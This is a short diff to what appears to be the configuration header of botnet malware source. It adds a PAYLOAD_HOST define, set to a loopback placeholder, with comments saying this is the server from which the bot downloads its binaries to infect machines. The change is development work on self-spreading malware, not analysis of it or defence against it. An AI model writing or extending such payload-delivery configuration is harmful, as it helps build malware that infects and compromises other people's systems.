@@ -18,6 +18,15 @@
 
 
 // ====================================================================
+// == PAYLOAD SERVER CONFIGURATION ==
+// ====================================================================
+
+// The IP address or domain name of the server hosting the bot payloads.
+// This is where the bot will download its binaries from for infection.
+#define PAYLOAD_HOST "127.0.0.1"
+
+
+// ====================================================================
 // == OTHER CONFIGURATION ==
 // ====================================================================
 
